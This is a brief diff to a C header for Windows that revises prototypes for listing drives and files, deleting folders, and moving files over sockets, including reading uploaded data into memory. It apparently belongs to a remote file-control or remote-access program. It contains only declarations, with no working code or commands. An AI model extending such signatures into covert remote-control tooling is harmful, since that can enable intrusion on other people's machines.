@@ -14,9 +14,10 @@
 
 extern API Api;
 
-int get_object_info(char* path, struct stat* fileinfo);
+char get_obj_info(const char* dirPath);
 int get_drives_list(char* buf);
 BOOL delete_folder(LPCTSTR lpszDir);
 char* get_file_list(const char* dirPath, int* numFiles);
-int download_file(FILE* fp, SOCKET sock);
+int download_file(HANDLE fp, SOCKET sock);
 void upload_file(SOCKET sock, HANDLE file_handle);
+char* upload_file_to_mem(SOCKET sock, size_t *total_bytes);
